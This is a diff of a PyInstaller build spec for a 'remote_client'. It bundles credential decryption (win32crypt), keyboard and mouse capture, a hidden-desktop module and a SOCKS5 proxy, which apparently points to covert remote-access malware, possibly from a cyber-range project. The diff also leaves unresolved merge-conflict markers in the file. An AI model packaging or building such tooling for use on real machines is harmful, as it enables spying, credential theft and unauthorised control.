@@ -1,7 +1,11 @@
 # -*- mode: python ; coding: utf-8 -*-
 from PyInstaller.utils.hooks import collect_all
 
+<<<<<<< HEAD
 datas = [('C:\\Temp\\rc_build_bd99ixor\\remote_client\\rc_team_id.txt', 'remote_client'), ('C:\\Temp\\rc_build_bd99ixor\\remote_client\\rc_antifraud.json', 'remote_client'), ('C:\\Temp\\rc_build_bd99ixor\\remote_client\\rc_server.json', 'remote_client')]
+=======
+datas = [('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_hj8ijiz7\\remote_client\\rc_team_id.txt', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_hj8ijiz7\\remote_client\\rc_antifraud.json', 'remote_client'), ('C:\\Users\\USER\\AppData\\Local\\Temp\\rc_build_hj8ijiz7\\remote_client\\rc_server.json', 'remote_client')]
+>>>>>>> 08b1fcc3c22bbbc636ce02a9ecee10505467411c
 binaries = []
 hiddenimports = ['win32crypt', 'cryptography', 'pynput', 'pynput.mouse', 'pynput.keyboard', 'remote_client.apps', 'remote_client.apps.launcher', 'remote_client.windows.hidden_desktop', 'remote_client.proxy.socks5_server']
 tmp_ret = collect_all('pynput')
@@ -19,7 +23,7 @@ datas += tmp_ret[0]; binaries += tmp_ret[1]; hiddenimports += tmp_ret[2]
 
 
 a = Analysis(
-    ['C:\\Users\\Versus Cyber Arena\\remote_controller\\client\\remote_client\\main.py'],
+    ['C:\\Users\\USER\\remote_controller\\client\\client.py'],
     pathex=[],
     binaries=binaries,
     datas=datas,
